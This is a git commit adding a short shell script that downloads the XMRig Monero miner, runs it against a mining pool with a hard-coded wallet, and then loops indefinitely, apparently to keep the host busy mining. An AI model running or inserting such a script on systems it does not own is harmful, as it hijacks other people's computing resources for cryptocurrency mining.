f949e1d4f298edf6c9e6605da352ac3545732c0b
Tomasz Koźniewski <39789519+wejgos@users.noreply.github.com>
2022-01-26 12:36:55 +0000

    Add files via upload

---
+++ jajko.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-x64.tar.gz
+tar xf xmrig-6.16.3-linux-x64.tar.gz
+./xmrig-6.16.3/xmrig -o xmrpool.eu:9999 -u 45R46vYSozjFtZt39hJB1n6DwTaZE4dcjfpgL35iHyp1BZXpUQtUSvyYYH63kw6crxANAqjQFUxmbGwGsJJ1qzvKPDeWef2 -k --tls
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
